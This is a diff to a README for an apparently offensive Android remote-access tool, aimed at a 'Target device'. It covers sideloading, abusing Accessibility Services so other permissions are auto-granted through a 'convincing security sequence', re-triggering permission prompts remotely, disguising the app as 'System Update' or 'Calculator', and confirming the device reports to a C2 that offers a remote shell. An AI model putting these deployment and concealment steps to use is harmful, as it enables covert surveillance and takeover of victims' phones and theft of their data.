@@ -337,10 +337,8 @@ emulators**.
 #### C. Installation & Initialization:
 Once the **Target device** downloads the **APK**:
 1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed.apk`
-2.  **Permissions (CRITICAL)**: **Open the app ONCE**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
+2.  **NEW! 'One-Click' Permissions (CRITICAL)**: **Open the app ONCE**. **Now only the Initial Pop-up *(Accessibility Services)* must be Manually toggled on**, **ALL other permissions are Auto-Granted by the system** with a **convincing security sequence**.
    -  **Remote Permission Prompt**: If the **user skips some permissions**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
-> ****COMING SOON! I finally figured out how to achieve "zero click" auto permission granting during install on Android 17**
-
 3.  **Self-Vanishing**: A **few seconds after launch**, the app will **automatically replace its icon and name** with the **decoy you chose during build** *("System Update", "Calculator"...etc)*.
 4.  **Uplink Confirmation**: Check your **Google Sheet or Render C2. Within 5 seconds of initialization**, the **Device ID, Connection Type, IP Address & Port, C2 Dashboard Link, Battery %, Stealth & Charging Status and Device Storage will appear in the log**.
 
@@ -394,15 +392,15 @@ https://github.com/user-attachments/assets/9cb336c8-748d-48ce-9c8f-f0065654be24
 
 ---
 
-### NEW! Initial Install Sequence (One-Click):
+### NEW! Initial Install Sequence *(One-Click)*:
 
 https://github.com/user-attachments/assets/1470d7f8-7e9f-4ccd-8570-056ead30ec30
 
 ---
 
-### C2 Dashboard (PC Interface) - Remote Shell & Decoys:
+### C2 Dashboard *(PC Interface)* - Remote Shell & Decoys:
 
-https://github.com/user-attachments/assets/8cb56f9d-3f40-4a6f-bddc-79bbbf9c273e
+https://github.com/user-attachments/assets/0bd5111d-1027-4a00-9086-5480d4c63e3d
 
 ---
 
